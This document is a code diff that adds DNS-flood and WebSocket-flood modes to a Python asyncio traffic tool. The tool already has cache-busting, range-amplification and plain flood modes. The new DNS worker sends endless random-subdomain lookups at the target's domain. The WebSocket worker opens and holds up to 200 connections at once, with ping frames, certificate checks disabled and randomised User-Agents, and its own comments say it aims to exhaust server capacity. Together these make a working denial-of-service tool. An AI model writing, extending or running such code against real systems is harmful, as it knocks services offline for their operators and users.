@@ -1,5 +1,7 @@
 import asyncio
+import base64
 import random
+import socket
 import time
 import ssl
 import string
@@ -551,6 +553,95 @@ class TrafficWorker:
                 self._result.add_latency(elapsed_ms)
                 self._result.error_breakdown[type(e).__name__] = self._result.error_breakdown.get(type(e).__name__, 0) + 1
 
+    # ── DNS flood ──────────────────────────────────────────────────────────
+    # Floods DNS resolver with unique random subdomain queries
+
+    async def _dns_flood_worker(self):
+        loop = asyncio.get_event_loop()
+        parsed = urlparse(self.profile.target_url)
+        base_domain = parsed.hostname or self.profile.target_url
+        while not self._stop_event.is_set():
+            rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=14))
+            subdomain = f"{rnd}.{base_domain}"
+            t0 = time.monotonic()
+            try:
+                await asyncio.wait_for(
+                    loop.run_in_executor(None, socket.gethostbyname, subdomain),
+                    timeout=3.0,
+                )
+            except Exception:
+                pass
+            finally:
+                elapsed_ms = (time.monotonic() - t0) * 1000
+                async with self._lock:
+                    self._result.total_requests += 1
+                    self._result.add_latency(elapsed_ms)
+                    self._result.status_codes["dns"] = self._result.status_codes.get("dns", 0) + 1
+
+    # ── WebSocket flood ────────────────────────────────────────────────────
+    # Opens and holds many WebSocket connections to exhaust server capacity
+
+    async def _websocket_worker(self):
+        parsed = urlparse(self.profile.target_url)
+        host = parsed.hostname or ""
+        port = parsed.port or (443 if parsed.scheme in ("https",) else 80)
+        is_ssl_ws = parsed.scheme in ("https", "wss")
+        path = parsed.path or "/"
+
+        while not self._stop_event.is_set():
+            t0 = time.monotonic()
+            writer = None
+            try:
+                ssl_ctx = None
+                if is_ssl_ws:
+                    ssl_ctx = ssl.create_default_context()
+                    ssl_ctx.check_hostname = False
+                    ssl_ctx.verify_mode = ssl.CERT_NONE
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(host, port, ssl=ssl_ctx),
+                    timeout=8,
+                )
+                ws_key = base64.b64encode(random.randbytes(16)).decode()
+                handshake = (
+                    f"GET {path} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"Upgrade: websocket\r\n"
+                    f"Connection: Upgrade\r\n"
+                    f"Sec-WebSocket-Key: {ws_key}\r\n"
+                    f"Sec-WebSocket-Version: 13\r\n"
+                    f"User-Agent: {get_random_headers()['User-Agent']}\r\n"
+                    f"\r\n"
+                )
+                writer.write(handshake.encode())
+                await writer.drain()
+                await asyncio.wait_for(reader.read(1024), timeout=5)
+                elapsed_ms = (time.monotonic() - t0) * 1000
+                async with self._lock:
+                    self._result.total_requests += 1
+                    self._result.success += 1
+                    self._result.add_latency(elapsed_ms)
+                    self._result.status_codes["websocket"] = self._result.status_codes.get("websocket", 0) + 1
+                # Hold connection open and send pings
+                hold_until = time.monotonic() + random.uniform(20, 60)
+                while not self._stop_event.is_set() and time.monotonic() < hold_until:
+                    writer.write(b"\x89\x00")  # WebSocket ping frame
+                    await writer.drain()
+                    await asyncio.sleep(random.uniform(10, 20))
+            except Exception:
+                elapsed_ms = (time.monotonic() - t0) * 1000
+                async with self._lock:
+                    self._result.total_requests += 1
+                    self._result.failed += 1
+                    self._result.add_latency(elapsed_ms)
+                    self._result.error_breakdown["ws_err"] = self._result.error_breakdown.get("ws_err", 0) + 1
+            finally:
+                if writer:
+                    try:
+                        writer.close()
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
+
     # ── RPS sampler ────────────────────────────────────────────────────────
 
     async def _rps_sampler(self):
@@ -633,6 +724,20 @@ class TrafficWorker:
                         pending.add(t)
                         t.add_done_callback(pending.discard)
                     await asyncio.sleep(0.005)
+
+                elif method_type == "dns_flood":
+                    if active < p.concurrency:
+                        t = asyncio.create_task(self._dns_flood_worker())
+                        pending.add(t)
+                        t.add_done_callback(pending.discard)
+                    await asyncio.sleep(0.05)
+
+                elif method_type == "websocket":
+                    if active < min(p.concurrency, 200):
+                        t = asyncio.create_task(self._websocket_worker())
+                        pending.add(t)
+                        t.add_done_callback(pending.discard)
+                    await asyncio.sleep(0.1)
 
                 elif method_type == "mixed":
                     # 40% cache-bust + 30% range-amplify + 30% regular flood
